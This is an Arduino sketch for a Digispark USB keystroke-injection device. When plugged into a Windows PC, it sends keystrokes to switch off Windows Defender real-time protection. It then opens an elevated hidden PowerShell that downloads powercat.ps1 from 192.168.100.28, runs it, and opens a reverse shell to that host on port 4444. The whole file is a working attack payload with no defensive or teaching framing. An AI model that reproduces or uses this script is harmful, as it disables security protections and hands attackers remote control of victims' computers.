#include "DigiKeyboard.h"

void setup() {
  //Turn off Real Time Protection
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("windowsdefender:");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(44);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //Get the Reverse Shell
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.100.28/powercat.ps1');powercat -c 192.168.100.28 -p 4444 -e powershell\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  

}

void loop() {
 
}
